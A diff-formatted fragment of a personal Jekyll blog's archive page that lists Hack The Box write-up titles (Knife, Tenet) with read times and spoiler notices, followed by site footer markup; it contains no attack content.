+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-knife/" rel="permalink">HTB: Knife Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/writeup/htb/htb-tenet/" rel="permalink">HTB: Tenet Writeup
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 Alex Loney. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
